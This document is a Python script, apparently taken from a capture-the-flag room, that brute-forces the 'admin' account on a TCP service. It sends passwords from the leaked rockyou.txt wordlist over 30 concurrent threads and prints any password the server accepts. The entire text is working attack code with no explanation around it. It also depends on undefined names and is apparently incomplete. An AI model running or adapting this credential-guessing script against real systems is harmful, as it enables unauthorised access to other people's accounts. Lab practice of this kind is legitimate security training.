# FROM ROOM OWNERS MEDIUM PAGE <<<<< I ADDED THIS LINE TO THE SCRIPT.

def test_this(password):
  # Create a socket object
  client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  try:
    # Connect to the server
    client_socket.connect(server_address)
    # Send the word to the server
    client_socket.sendall('admin'.encode())
    # Receive data from the server (if applicable)
    response = client_socket.recv(1024)
    response = response.decode()
    if 'Password' in response:
      client_socket.sendall(password)
      response = client_socket.recv(1024)
      response = response.decode()
    if not 'Password' in response:
      print('Password:', password)
  except ConnectionRefusedError:
    print("Connection was refused. Is the server running?")
  finally:
    # Close the socket connection
    client_socket.close()

def test_creds():
  from threading import Thread
  wordlist = '/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt'
  passwords = read_wordlist_from_file(wordlist)
  threads = []
  for password in passwords:
    thread = Thread(target=test_this, args=(password, ))
    thread.start()
    threads.append(thread)
    if len(threads) >= 30:
      for thread in threads:
        thread.join()
        threads = []
